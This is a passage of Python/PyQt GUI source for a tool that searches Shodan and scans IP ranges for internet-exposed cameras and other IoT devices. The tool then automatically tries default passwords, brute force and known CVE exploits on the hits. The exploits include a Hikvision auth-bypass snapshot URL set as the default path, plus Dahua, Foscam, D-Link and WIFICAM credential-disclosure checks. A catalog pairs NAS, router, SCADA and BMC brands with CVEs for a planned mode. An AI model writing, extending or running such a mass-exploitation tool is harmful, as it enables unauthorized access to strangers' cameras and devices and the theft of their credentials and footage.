        self.port_spin.setRange(1, 65535)
        self.port_spin.setValue(80)
        basic_form.addRow(self.port_row_label, self.port_spin)
        self.pages_spin = QSpinBox()
        self.pages_spin.setRange(1, 50)
        self.pages_spin.setValue(10)
        basic_form.addRow("Pages:", self.pages_spin)
        self.path_row_label = QLabel("Path:")
        self.path_edit = QLineEdit("onvif-http/snapshot?auth=YWRtaW46MTEK")
        basic_form.addRow(self.path_row_label, self.path_edit)

        # ── Multi IoT mode fields (hidden unless "Multi IoT Mode" is toggled) ──
        # Placeholder fields for the non-camera IoT scan mode. Device Type lists
        # IoT categories; picking one repopulates IoT Brand/Device with example
        # (placeholder) vulnerable products for that category. Real Shodan/CVE
        # wiring (e.g. QNAP) is the next task; these are just the UI + toggle.
        self.iot_type_label = QLabel("Device Type:")
        self.iot_type_combo = QComboBox()
        self.iot_type_combo.addItems(list(self._iot_device_catalog().keys()))
        self.iot_type_combo.currentTextChanged.connect(self.on_iot_type_changed)
        basic_form.addRow(self.iot_type_label, self.iot_type_combo)

        self.iot_brand_label = QLabel("IoT Brand/Device:")
        self.iot_brand_combo = QComboBox()
        self.iot_brand_combo.currentTextChanged.connect(self.on_iot_device_changed)
        basic_form.addRow(self.iot_brand_label, self.iot_brand_combo)

        self.iot_port_label = QLabel("Port:")
        self.iot_port_spin = QSpinBox()
        self.iot_port_spin.setRange(1, 65535)
        self.iot_port_spin.setValue(80)
        self.iot_port_spin.valueChanged.connect(lambda _: self._preview_multi_iot_query())
        basic_form.addRow(self.iot_port_label, self.iot_port_spin)

        self.iot_country_label = QLabel("Country:")
        self.iot_country_combo = QComboBox()
        self.iot_country_combo.addItems(COUNTRY_CODES.keys())
        self.iot_country_combo.currentTextChanged.connect(lambda _: self._preview_multi_iot_query())
        basic_form.addRow(self.iot_country_label, self.iot_country_combo)

        for _iw in (self.iot_type_label, self.iot_type_combo, self.iot_brand_label,
                    self.iot_brand_combo, self.iot_port_label, self.iot_port_spin,
                    self.iot_country_label, self.iot_country_combo):
            _iw.hide()

        # IP Scanner fields
        self.ip_scan_type_label = QLabel("Scan Type:")
        self.ip_scan_type_combo = QComboBox()
        self.ip_scan_type_combo.addItems(["CIDR", "IP Range"])
        self.ip_scan_type_combo.currentTextChanged.connect(self.on_ip_scan_type_changed)
        basic_form.addRow(self.ip_scan_type_label, self.ip_scan_type_combo)
        # Dahua scan method selector (Masscan / CIDR / IP Range / Current Results)
        self.scan_method_label = QLabel("Scan Method:")
        self.scan_method_combo = QComboBox()
        self.scan_method_combo.addItems(["Auto", "Masscan", "Shodan", "CIDR", "IP Range", "Current Results", "Random Countries"])
        basic_form.addRow(self.scan_method_label, self.scan_method_combo)
        self.scan_method_label.hide()
        self.scan_method_combo.hide()
        self.cidr_label = QLabel("Subnet (CIDR):")
        self.cidr_edit = QLineEdit()
        self.cidr_edit.setPlaceholderText("e.g., 192.168.1.0/24")
        basic_form.addRow(self.cidr_label, self.cidr_edit)
        self.ip_start_label = QLabel("Start IP:")
        self.ip_start_edit = QLineEdit()
        self.ip_start_edit.setPlaceholderText("e.g., 92.21.132.157")
        basic_form.addRow(self.ip_start_label, self.ip_start_edit)
        self.ip_end_label = QLabel("End IP:")
        self.ip_end_edit = QLineEdit()
        self.ip_end_edit.setPlaceholderText("e.g., 92.25.132.157")
        basic_form.addRow(self.ip_end_label, self.ip_end_edit)
        self.ports_label = QLabel("Ports:")
        self.ports_edit = QLineEdit()
        self.ports_edit.setPlaceholderText("e.g., 80,443,22,21,8080")
        self.ports_edit.setText("80,443,8080,8000,37777,37778,10554,9000,5000,554")
        basic_form.addRow(self.ports_label, self.ports_edit)
        self.scan_concurrency_label = QLabel("Max Concurrency:")
        self.scan_concurrency_spin = QSpinBox()
        self.scan_concurrency_spin.setRange(1, 500)
        self.scan_concurrency_spin.setValue(100)
        basic_form.addRow(self.scan_concurrency_label, self.scan_concurrency_spin)

        # Hide IP Scanner fields initially
        self.ip_scan_type_label.hide()
        self.ip_scan_type_combo.hide()
        self.cidr_label.hide()
        self.cidr_edit.hide()
        self.ip_start_label.hide()
        self.ip_start_edit.hide()
        self.ip_end_label.hide()
        self.ip_end_edit.hide()
        self.ports_label.hide()
        self.ports_edit.hide()
        self.scan_concurrency_label.hide()
        self.scan_concurrency_spin.hide()

        self.custom_query_label = QLabel("Custom Query:")
        self.custom_query_edit = QLineEdit()
        self.custom_query_edit.setPlaceholderText("e.g., product:\"CCTV Brand\" country:US")
        basic_form.addRow(self.custom_query_label, self.custom_query_edit)
        self.custom_query_label.hide()
        self.custom_query_edit.hide()

        basic_controls.setLayout(basic_form)

        # Multi IoT mode bookkeeping. on_brand_changed manages every camera-mode
        # row EXCEPT the Camera Brand row itself, so grab that row's auto-created
        # label to hide/show the whole row when swapping modes.
        self.multi_iot_mode = False
        # QFormLayout does NOT auto-hide the labels of string-added rows, so grab
        # the auto-created "Camera Brand:" / "Country:" / "Pages:" labels to hide
        # them explicitly in Multi IoT mode (otherwise they'd dangle / duplicate).
        self._brand_field_label = basic_form.labelForField(self.brand_combo)
        self._country_field_label = basic_form.labelForField(self.country_combo)
        self._pages_field_label = basic_form.labelForField(self.pages_spin)
        self._multi_iot_widgets = [
            self.iot_type_label, self.iot_type_combo,
            self.iot_brand_label, self.iot_brand_combo,
            self.iot_port_label, self.iot_port_spin,
            self.iot_country_label, self.iot_country_combo,
        ]
        self._camera_quick_widgets = [
            self.brand_combo, self.country_combo,
            self.year_row_label, self.year_combo,
            self.port_row_label, self.port_spin, self.pages_spin,
            self.path_row_label, self.path_edit,
            self.scan_method_label, self.scan_method_combo,
            self.ip_scan_type_label, self.ip_scan_type_combo,
            self.cidr_label, self.cidr_edit,
            self.ip_start_label, self.ip_start_edit,
            self.ip_end_label, self.ip_end_edit,
            self.ports_label, self.ports_edit,
            self.scan_concurrency_label, self.scan_concurrency_spin,
            self.custom_query_label, self.custom_query_edit,
        ]
        for _lbl in (self._brand_field_label, self._country_field_label,
                     self._pages_field_label):
            if _lbl is not None:
                self._camera_quick_widgets.append(_lbl)
        # Populate the IoT Brand list for the initial device type (no-op preview
        # since Multi IoT mode is off at startup).
        self.on_iot_type_changed(self.iot_type_combo.currentText())

        # Put Quick Search (left) and a Message of the Day box (right) in a
        # horizontal splitter that mirrors the results/browser splitter below it,
        # so the MOTD box lines up with - and is the same width as - the browser
        # window beneath it. The two splitters are kept in sync further down.
        self.top_splitter = QSplitter(Qt.Orientation.Horizontal)
        self.top_splitter.setChildrenCollapsible(False)
        self.top_splitter.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Maximum)
        self.top_splitter.addWidget(basic_controls)

        # Message of the Day - shows a placeholder banner image scaled to COVER
        # the box (fills it, cropping the overflow edges) with rounded corners so
        # it sits neatly inside the group box. Falls back to placeholder text if
        # the image can't be loaded. Populate later via _update_motd_image / text.
        self.motd_box = QGroupBox("Message of the Day")
        self.motd_box.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Preferred)
        motd_layout = QVBoxLayout(self.motd_box)
        motd_layout.setContentsMargins(8, 8, 8, 8)
        motd_layout.setSpacing(6)
        self.motd_label = QLabel("Message of the day will appear here.")
        self.motd_label.setWordWrap(True)
        self.motd_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.motd_label.setMinimumSize(320, 140)
        self.motd_label.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
        self.motd_label.setScaledContents(False)
        self._motd_pixmap = QPixmap(self.resource_path("Images/6795428263.png"))
        # Re-render the cover-cropped image whenever the label resizes.
        self.motd_label.resizeEvent = self._motd_label_resize_event
        motd_layout.addWidget(self.motd_label, 1)
        self.top_splitter.addWidget(self.motd_box)
        self.top_splitter.setStretchFactor(0, 3)
        self.top_splitter.setStretchFactor(1, 4)

        layout.addWidget(self.top_splitter)

        self.splitter = QSplitter(Qt.Orientation.Horizontal)
        layout.addWidget(self.splitter, 1)

        self.filter_tabs = QTabWidget()
        self.filter_tabs.currentChanged.connect(self.on_tab_changed)

        self.table = QTableWidget(0, 4)
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.table.doubleClicked.connect(self.on_row_double_click)
        self.filter_tabs.addTab(self.table, "All")

        self.good_table = QTableWidget(0, 4)
        self.good_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.good_table.doubleClicked.connect(self.on_row_double_click)
        self.filter_tabs.addTab(self.good_table, "Good")

        self.bad_table = QTableWidget(0, 4)
        self.bad_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.bad_table.doubleClicked.connect(self.on_row_double_click)
        self.filter_tabs.addTab(self.bad_table, "Bad")

        # "Port 22 Open" tab: Good-tab IPs whose tcp/22 is confirmed open by an
        # nmap scan land here. Placed between Bad and Favorites (mirrors the
        # Good table's columns; kept in sync by update_table_headers).
        self.port22_table = QTableWidget(0, 4)
        self.port22_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.port22_table.doubleClicked.connect(self.on_row_double_click)
        self.filter_tabs.addTab(self.port22_table, "Port 22 Open")

        self.fav_table = QTableWidget(0, 2)
        self.fav_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.fav_table.doubleClicked.connect(self.on_fav_double_click)
        self.filter_tabs.addTab(self.fav_table, "Favorites")
        self.fav_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.fav_table.customContextMenuRequested.connect(self.show_fav_context_menu)

        # Logs tab: split into "Backend" (the full, unfiltered scan/system log
        # stream, unchanged) and "Exploit" (a filtered mirror of just the
        # [CVE-...] exploit-result lines, so they don't get lost in the high
        # volume of ordinary scan log traffic - see self.log()'s routing).
        logs_container = QWidget()
        logs_container_layout = QVBoxLayout(logs_container)
        logs_container_layout.setContentsMargins(0, 0, 0, 0)
        self.logs_subtabs = QTabWidget()

        backend_tab = QWidget()
        backend_layout = QVBoxLayout(backend_tab)
        self.backend_log_clear_btn = QPushButton("Clear Backend Log")
        self.backend_log_clear_btn.clicked.connect(lambda: self.log_view.clear())
        backend_layout.addWidget(self.backend_log_clear_btn)
        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        # Cap scrollback so a long scan doesn't make the widget progressively
        # slower to append to as the document grows without bound.
        self.log_view.document().setMaximumBlockCount(2000)
        self.highlighter = LogHighlighter(self.log_view.document())
        backend_layout.addWidget(self.log_view, 1)
        self.logs_subtabs.addTab(backend_tab, "Backend")

        exploit_tab = QWidget()
        exploit_layout = QVBoxLayout(exploit_tab)
        self.exploit_log_clear_btn = QPushButton("Clear Exploit Log")
        self.exploit_log_clear_btn.clicked.connect(lambda: self.exploit_log_view.clear())
        exploit_layout.addWidget(self.exploit_log_clear_btn)
        self.exploit_log_view = QTextEdit()
        self.exploit_log_view.setReadOnly(True)
        self.exploit_log_view.document().setMaximumBlockCount(2000)
        self.exploit_highlighter = LogHighlighter(self.exploit_log_view.document())
        exploit_layout.addWidget(self.exploit_log_view, 1)
        self.logs_subtabs.addTab(exploit_tab, "Exploit")

        logs_container_layout.addWidget(self.logs_subtabs)
        self.filter_tabs.addTab(logs_container, "Logs")

        # Flush batched log lines (queued by self.log()) on a short timer
        # instead of appending on every single message.
        self._log_flush_timer = QTimer(self)
        self._log_flush_timer.setInterval(150)
        self._log_flush_timer.timeout.connect(self._flush_log_queues)
        self._log_flush_timer.start()

        self.passwords_table = QTableWidget(0, 3)
        self.passwords_table.setHorizontalHeaderLabels(["Camera Brand", "Username", "Password"])
        self.passwords_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        # Click a brand header row to collapse/expand its credentials.
        self.passwords_table.cellClicked.connect(self._toggle_password_brand)
        self.filter_tabs.addTab(self.passwords_table, "Default Passwords")

        self.history_table = QTableWidget(0, 4)
        self.history_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.history_table.doubleClicked.connect(self.load_selected_history)
        self.filter_tabs.addTab(self.history_table, "History")

        self.update_table_headers()

        # Emoji font
        font_path = self.resource_path("fonts/NotoColorEmoji_WindowsCompatible.ttf")
        if Path(font_path).exists():
            font_id = QFontDatabase.addApplicationFont(font_path)
            if font_id != -1:
                families = QFontDatabase.applicationFontFamilies(font_id)
                if families:
                    emoji_family = families[0]
                    base_font = QFont("Segoe UI", 10)
                    QFont.insertSubstitution(base_font.family(), emoji_family)
                    for table in [self.table, self.good_table, self.bad_table, self.port22_table, self.fav_table, self.passwords_table]:
                        table.setFont(base_font)

        self.splitter.addWidget(self.filter_tabs)

        # Browser frame
        browser_frame = QFrame()
        self.browser_frame = browser_frame
        browser_frame.setStyleSheet("background: #0d1b2a; border: 2px solid #00d4ff; border-radius: 8px;")
        browser_layout = QVBoxLayout(browser_frame)
        browser_layout.setContentsMargins(0,0,0,0)
        self.controls_frame = QFrame()
        self.controls_frame.setStyleSheet("background: #1b263b; border-bottom: 1px solid #00d4ff;")
        controls_layout = QHBoxLayout(self.controls_frame)
        self.url_bar = QLineEdit()
        self.url_bar.setPlaceholderText("Enter camera URL or double-click a result...")
        self.url_bar.setStyleSheet("background: #16213e; color: #a8e6cf; border: 1px solid #00d4ff; padding: 8px; border-radius: 6px;")
        self.url_bar.returnPressed.connect(self.load_url)
        controls_layout.addWidget(self.url_bar, 1)
        self.refresh_btn = QPushButton("Refresh")
        self.refresh_btn.setStyleSheet(self.tz_button.styleSheet())
        self.refresh_btn.clicked.connect(self.refresh_browser)
        controls_layout.addWidget(self.refresh_btn)
        self.screenshot_btn = QPushButton("Capture")
        self.screenshot_btn.setStyleSheet(self.tz_button.styleSheet())
        self.screenshot_btn.clicked.connect(self.capture_snapshot)
        controls_layout.addWidget(self.screenshot_btn)
        self.save_fav_btn = QPushButton("Save to Favorites")
        self.save_fav_btn.setStyleSheet(self.tz_button.styleSheet())
        self.save_fav_btn.clicked.connect(self.save_current_to_favorites)
        controls_layout.addWidget(self.save_fav_btn)
        self.prev_btn = QPushButton(" Previous")
        self.next_btn = QPushButton(" Next")
        self.prev_btn.setIcon(self._arrow_icon("left"))
        self.next_btn.setIcon(self._arrow_icon("right"))
        self.prev_btn.setStyleSheet(self.tz_button.styleSheet())
        self.next_btn.setStyleSheet(self.tz_button.styleSheet())
        self.prev_btn.clicked.connect(self.show_previous_result)
        self.next_btn.clicked.connect(self.show_next_result)
        controls_layout.addWidget(self.prev_btn)
        controls_layout.addWidget(self.next_btn)
        browser_layout.addWidget(self.controls_frame)

        # browser container now uses a stacked widget so we can reliably switch
        # between IE / WebEngine and the embedded PSS view
        self.browser_container = QFrame()
        self.browser_container.setStyleSheet("background: #0d1b2a;")
        browser_container_layout = QVBoxLayout(self.browser_container)
        browser_container_layout.setContentsMargins(0, 0, 0, 0)

        self.browser_stack = QStackedWidget()

        # IE frame wrapper (index 0)
        self.ie_frame = QFrame()
        self.ie_frame.setObjectName("ie_frame")
        self.ie_frame.installEventFilter(self)
        ie_wrapper = QWidget()
        ie_layout = QVBoxLayout(ie_wrapper)
        ie_layout.setContentsMargins(0, 0, 0, 0)
        ie_layout.addWidget(self.ie_frame)
        self.browser_stack.addWidget(ie_wrapper)

        # WebEngine view (index 1)
        self.web_view = QWebEngineView()
        self.web_view.setUrl(QUrl("about:blank"))
        self.browser_stack.addWidget(self.web_view)

        # PSS embedded view (index 2)
        try:
            self.pss_widget = self.create_pss_widget()
        except Exception as e:
            self.log(f"Failed to create PSS widget: {e}", "warning")
            try:
                self.pss_widget = self._make_pss_placeholder_widget()
            except Exception as ex:
                self.log(f"Failed to create PSS placeholder: {ex}", "error")
                self.pss_widget = QWidget()
        self.browser_stack.addWidget(self.pss_widget)

        # Metasploit-style CVE/Exploit overlay (index 3) - shown/hidden via the
        # View menu's "Metasploit Overlay" checkbox, see toggle_vuln_overlay().
        try:
            self.vuln_overlay_widget = self.create_vuln_overlay_widget()
        except Exception as e:
            self.log(f"Failed to create vuln overlay widget: {e}", "warning")
            self.vuln_overlay_widget = QWidget()
        self.browser_stack.addWidget(self.vuln_overlay_widget)

        # default to web view unless IE mode requested
        if self.use_ie:
            self.browser_stack.setCurrentIndex(0)
        else:
            self.browser_stack.setCurrentIndex(1)

        browser_container_layout.addWidget(self.browser_stack)
        browser_layout.addWidget(self.browser_container, 1)
        self.splitter.addWidget(browser_frame)
        self.splitter.setSizes([500, 900])

        # Lock the top splitter's column widths to the main splitter's so the
        # Message of the Day box always matches the browser window's width, and
        # dragging either divider moves the other.
        self.top_splitter.setSizes(self.splitter.sizes())
        self.splitter.splitterMoved.connect(lambda *a: self.top_splitter.setSizes(self.splitter.sizes()))
        self.top_splitter.splitterMoved.connect(lambda *a: self.splitter.setSizes(self.top_splitter.sizes()))

        QTimer.singleShot(500, self.resize_browser_container)
        self.browser_container.resizeEvent = lambda event: QTimer.singleShot(10, self.resize_browser_container)
        # Initial render of the Message of the Day banner once the label has a
        # real size (it's 0x0 during __init__).
        QTimer.singleShot(0, self._update_motd_image)

        self.navigate_start_page()

        # Status bar: thin progress bar + dynamic percent + fullscreen for PSS + PSS mic/sound
        self.status = QStatusBar()
        self.setStatusBar(self.status)

        # Progress bar (thin) and percent label
        self.progress = QProgressBar()
        self.progress.setFixedHeight(14)
        self.progress.setMaximumWidth(280)
        self.progress.setRange(0, 100)
        self.progress.setTextVisible(False)
        self.progress.setValue(0)
        self.progress.valueChanged.connect(self.on_progress_value_changed)

        self.progress_pct_label = QLabel("0%")
        self.progress_pct_label.setFixedWidth(44)
        self.progress_pct_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.progress_pct_label.setStyleSheet("font-weight:bold; color:#ff4d4d;")

        # PSS fullscreen toggle (keeps toolbar/statusbar visible)
        self.pss_fullscreen_btn = QPushButton("⛶")
        self.pss_fullscreen_btn.setToolTip("Toggle PSS fullscreen (keep toolbar/statusbar)")
        self.pss_fullscreen_btn.setCheckable(True)
        self.pss_fullscreen_btn.setFixedSize(26, 22)
        self.pss_fullscreen_btn.clicked.connect(self.toggle_pss_fullscreen)

        # Add progress, percent, fullscreen, then status label
        # (per-channel Mic/Sound controls now live on each feed widget instead
        # of here - see _make_feed_widget)
        self.status.addPermanentWidget(self.progress)
        self.status.addPermanentWidget(self.progress_pct_label)
        self.status.addPermanentWidget(self.pss_fullscreen_btn)
        self.status_label = QLabel("Idle")
        self.status_label.setStyleSheet("QLabel { font-weight: bold; margin-left: 10px; }")
        self.status.addPermanentWidget(self.status_label)

        for t in [self.table, self.good_table, self.bad_table, self.port22_table, self.fav_table, self.passwords_table]:
            t.setAlternatingRowColors(True)
        for tbl in [self.table, self.good_table, self.bad_table, self.port22_table]:
            tbl.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
            tbl.customContextMenuRequested.connect(self.on_table_context_menu)

        self.setup_browser()
        self.populate_default_passwords()
        self.load_history_table()
        # Ensure UI reflects the initially selected brand
        try:
            self.on_brand_changed(self.brand_combo.currentText())
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Brand logic – Axis behaves just like Hikvision/Reecam
    # ------------------------------------------------------------------
    def on_brand_changed(self, brand):
        is_hikvision = brand == "Hikvision"
        is_dahua = brand == "Dahua"
        is_avtech   = brand == "AVTech"
        is_reecam   = brand == "Reecam"
        is_axis     = brand == "Axis"
        # IP Scanner mode is specifically the standalone IP Scanner option.
        # Treat Dahua separately so we can keep country selection visible for Dahua.
        is_ip_scanner = brand == "IP Scanner"
        is_custom   = brand == "Custom Query"
        is_dvr      = brand == "DVR LOGIN"
        is_wificam  = brand == "WIFICAM"
        is_xiongmai = brand == "XiongMai"
        is_foscam   = brand == "Foscam"
        is_dlink    = brand == "D-Link"
        is_amcrest  = brand == "Amcrest"
        is_tapo     = brand == "Tapo"

        # Year only for Hikvision
        self.year_row_label.setVisible(is_hikvision)
        self.year_combo.setVisible(is_hikvision)
        # Port visible for all camera brands except IP Scanner / Custom
        # Include Dahua so user can override the default 37777 when needed
        self.port_row_label.setVisible(is_hikvision or is_reecam or is_avtech or is_axis or is_dahua or is_dvr or is_wificam or is_xiongmai or is_foscam or is_dlink or is_amcrest or is_tapo)
        self.port_spin.setVisible(is_hikvision or is_reecam or is_avtech or is_axis or is_dahua or is_dvr or is_wificam or is_xiongmai or is_foscam or is_dlink or is_amcrest or is_tapo)
        # Path visible for Hikvision, Reecam, Axis (custom path for snapshot)
        self.path_row_label.setVisible(is_hikvision or is_reecam or is_axis)
        self.path_edit.setVisible(is_hikvision or is_reecam or is_axis)

        # Set default path depending on brand
        if is_axis:
            self.path_edit.setText("axis-cgi/jpg/image.cgi?resolution=320x240")
        elif is_hikvision:
            self.path_edit.setText("onvif-http/snapshot?auth=YWRtaW46MTEK")
        elif is_reecam:
            self.path_edit.setText("")  # Reecam may not need a custom path
        elif is_dahua:
            # Dahua snapshot flow uses TCP protocol (default port 37777) so no HTTP path
            self.path_edit.setText("")
        else:
            self.path_edit.setText("")

        # Country is not applied to a raw Custom Query (build_query returns the
        # user's text verbatim), so hide it in that mode to avoid the impression
        # it filters results - add country:"XX" to the query text instead.
        self.country_combo.setVisible(not is_ip_scanner and not is_custom)
        self.pages_spin.setVisible(not is_ip_scanner)

        # show/hide Dahua scan method selector
        try:
            self.scan_method_label.setVisible(is_dahua)
            self.scan_method_combo.setVisible(is_dahua)
        except Exception:
            pass

        # IP Scanner toggles unchanged
        self.ip_scan_type_label.setVisible(is_ip_scanner)
        self.ip_scan_type_combo.setVisible(is_ip_scanner)
        self.cidr_label.setVisible(is_ip_scanner and self.ip_scan_type_combo.currentText() == "CIDR")
        self.cidr_edit.setVisible(is_ip_scanner and self.ip_scan_type_combo.currentText() == "CIDR")
        self.ip_start_label.setVisible(is_ip_scanner and self.ip_scan_type_combo.currentText() == "IP Range")
        self.ip_start_edit.setVisible(is_ip_scanner and self.ip_scan_type_combo.currentText() == "IP Range")
        self.ip_end_label.setVisible(is_ip_scanner and self.ip_scan_type_combo.currentText() == "IP Range")
        self.ip_end_edit.setVisible(is_ip_scanner and self.ip_scan_type_combo.currentText() == "IP Range")
        self.ports_label.setVisible(is_ip_scanner)
        self.ports_edit.setVisible(is_ip_scanner)
        self.scan_concurrency_label.setVisible(is_ip_scanner)
        self.scan_concurrency_spin.setVisible(is_ip_scanner)

        self.custom_query_label.setVisible(is_custom)
        self.custom_query_edit.setVisible(is_custom)

        self.update_table_headers()

        if is_avtech:
            self.log("AVTech mode activated - IP-only results.", "info")
        elif is_hikvision:
            try:
                # Switching from Dahua left this spinbox on 37777 - give
                # Hikvision its own default instead of inheriting the last
                # brand's port.
                self.port_spin.setValue(80)
            except Exception:
                pass
            self.log("Hikvision mode activated.", "info")
        elif is_dahua:
            self.log("Dahua mode activated - inventory/subnet scanning (local only).", "info")
            # show Dahua-only buttons and lock ports to 37777
            try:
                self.dahua_brute_btn.setVisible(True)
                self.dahua_snap_btn.setVisible(True)
                self.dahua_masscan_btn.setVisible(True)
                self.dahua_export_xml_btn.setVisible(True)
            except Exception:
                pass
            try:
                # default to common Dahua TCP port, but allow override via port spin
                try:
                    self.port_spin.setValue(37777)
                    self.port_spin.setEnabled(True)
                except Exception:
                    pass
                # keep ports_edit disabled (not used in Dahua mode)
                self.ports_edit.setText("37777")
                self.ports_edit.setEnabled(False)
            except Exception:
                pass
            # warn if masscan isn't available
            try:
                if not shutil.which('masscan'):
                    self.log("masscan not found in PATH. Use Settings -> Manage Masscan to install.", "warning")
            except Exception:
                pass
        elif is_axis:
            self.log("Axis mode activated. Choose port (e.g., 80, 10000, 8081) and path.", "info")
        elif is_ip_scanner:
            self.log("IP Scanner mode activated. Choose CIDR or IP Range.", "info")
            # hide Dahua-only buttons in other IP Scanner modes
            try:
                self.dahua_brute_btn.setVisible(False)
                self.dahua_snap_btn.setVisible(False)
                self.dahua_masscan_btn.setVisible(False)
                self.dahua_export_xml_btn.setVisible(False)
            except Exception:
                pass
            try:
                default_ports = "80,443,8080,8000,37777,37778,10554,9000,5000,554"
                if not self.ports_edit.text() or self.ports_edit.text().strip() == "37777":
                    self.ports_edit.setText(default_ports)
                self.ports_edit.setEnabled(True)
            except Exception:
                pass
        elif is_custom:
            self.log("Custom Query mode activated.", "info")
        elif is_dvr:
            try:
                # DVRs usually front their login.rsp page on port 80; user can override.
                if self.port_spin.value() in (37777, 0):
                    self.port_spin.setValue(80)
            except Exception:
                pass
            self.log("DVR LOGIN mode activated - Shodan html:\"login.rsp\". Good hits are "
                     "auto-checked for CVE-2018-9995 credential disclosure (results in Logs).", "info")
        elif is_wificam:
            try:
                # GoAhead-based WIFICAM cameras almost always serve on port 80.
                if self.port_spin.value() in (37777, 0):
                    self.port_spin.setValue(80)
            except Exception:
                pass
            self.log("WIFICAM mode activated - Shodan GoAhead-Webs banner match. Good hits are "
                     "auto-checked for CVE-2017-8225 credential disclosure (results in Logs).", "info")
        elif is_xiongmai:
            try:
                # XiongMai's uc-httpd almost always serves on port 80.
                if self.port_spin.value() in (37777, 0):
                    self.port_spin.setValue(80)
            except Exception:
                pass
            self.log("XiongMai mode activated - Shodan uc-httpd banner match. Good hits are "
                     "auto-checked for CVE-2017-7577 directory-traversal file disclosure (results in Logs).", "info")
        elif is_foscam:
            try:
                # Verified empirically: real Foscam Shodan matches are almost
                # never on port 80 (checked 100 live matches - zero were on
                # 80). Port 8081 was by far the most common (21% of the
                # sample, more than double the next port), so default there
                # instead of the generic web-default of 80.
                if self.port_spin.value() in (37777, 80, 0):
                    self.port_spin.setValue(8081)
            except Exception:
                pass
            self.log("Foscam mode activated - Shodan Foscam banner match. Good hits are "
                     "auto-checked for CVE-2018-19067 hardcoded backdoor account (results in Logs).", "info")
        elif is_dlink:
            try:
                # D-Link DCS cameras factory-default to port 80 (unlike the
                # other OEM-family brands above, this wasn't re-verified live
                # this round - adjust the Port field if it turns out wrong).
                if self.port_spin.value() in (37777, 8081, 0):
                    self.port_spin.setValue(80)
            except Exception:
                pass
            self.log("D-Link mode activated - Shodan D-Link DCS banner match. Good hits are "
                     "auto-checked for CVE-2020-25078 plaintext credential disclosure (results in Logs).", "info")
        elif is_amcrest:
            try:
                # Amcrest's web UI factory-defaults to port 80.
                if self.port_spin.value() in (37777, 8081, 0):
                    self.port_spin.setValue(80)
            except Exception:
                pass
            self.log("Amcrest mode activated - Shodan Amcrest banner match. Amcrest is Dahua's "
                     "US OEM partner (shared chipset/firmware), so Good hits are auto-checked for "
                     "the same DHIP auth-bypass technique as Dahua (CVE-2021-33044/33045) - via a "
                     "fully separate code path from the Dahua masscan pipeline (results in Logs).", "info")
        elif is_tapo:
            try:
                # Tapo's local HTTPS "camera account" API (TLS cert CN
                # "TAPO-DEVICE") always serves on 443 - live-verified all 239
                # Shodan matches were on that port.
                if self.port_spin.value() in (37777, 8081, 0):
                    self.port_spin.setValue(443)
            except Exception:
                pass
            self.log("Tapo mode activated - Shodan TAPO-DEVICE cert match. Good hits are TLS-cert "
                     "re-confirmed as genuine Tapo devices, then checked for a weak/reused camera-"
                     "account password from the Default Passwords tab (Tapo has no static factory "
                     "default like Hikvision/Dahua - results in Logs).", "info")
        else:
            self.log("Reecam mode activated.", "info")

        # ensure browser embedding/size stays correct after brand switch
        try:
            QTimer.singleShot(50, self.resize_browser_container)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Multi IoT mode - a second Quick Search profile for non-camera IoT
    # devices (NAS/printer/router/...). PLACEHOLDER data for now; the real
    # Shodan queries + per-device CVE logic (QNAP first) land in the next task.
    # This only ever shows/hides Quick Search rows - no other behaviour changes.
    # ------------------------------------------------------------------
    def _iot_device_catalog(self):
        """PLACEHOLDER catalog: IoT device type -> example vulnerable devices.
        Names carry an example CVE so the list reads realistically; both the
        types and the devices are placeholders to refine as we build this out."""
        return {
            "NAS": ["QNAP (CVE-2022-27593)", "Synology (CVE-2021-29076)",
                    "WD My Cloud (CVE-2021-40438)", "Asustor (CVE-2021-44142)",
                    "TerraMaster (CVE-2022-24990)", "Buffalo LinkStation (CVE-2021-20655)"],
            "Printer": ["HP (CVE-2017-2741)", "Canon (CVE-2022-24672)",
                        "Brother (CVE-2024-51978)", "Epson (CVE-2022-40967)",
                        "Lexmark (CVE-2023-26067)", "Xerox (CVE-2022-23968)"],
            "Router/Gateway": ["MikroTik (CVE-2018-14847)", "TP-Link (CVE-2023-1389)",
                               "Netgear (CVE-2016-6277)", "Asus (CVE-2024-3080)",
                               "Zyxel (CVE-2023-28771)", "DrayTek (CVE-2020-8515)"],
            "DVR/NVR": ["Hikvision (CVE-2021-36260)", "Dahua (CVE-2021-33044)",
                        "XiongMai (CVE-2017-7577)", "Vivotek (CVE-2021-33544)",
                        "Reolink (CVE-2021-40404)"],
            "Smart Home Hub": ["Sonoff (CVE-2022-27479)", "Tuya (CVE-2021-30627)",
                               "TP-Link Kasa (CVE-2021-4045)", "Home Assistant (CVE-2023-27482)",
                               "Shelly (CVE-2021-34045)"],
            "VoIP/IP Phone": ["Grandstream (CVE-2020-5722)", "Yealink (CVE-2021-27561)",
                              "Cisco SPA (CVE-2020-3161)", "Fanvil (CVE-2021-41770)",
                              "Polycom (CVE-2022-23984)"],
            "Industrial/SCADA": ["Siemens S7 (CVE-2019-10929)", "Moxa (CVE-2019-5136)",
                                 "Schneider (CVE-2021-22779)", "Rockwell (CVE-2021-22681)",
                                 "Advantech (CVE-2021-22652)"],
            "Server / BMC": ["Dell iDRAC (CVE-2018-1207)", "HP iLO (CVE-2017-12542)",
                             "Supermicro IPMI (CVE-2019-16649)", "APC UPS (CVE-2022-22805)",
                             "VMware ESXi (CVE-2021-21974)", "Webmin (CVE-2019-15107)"],
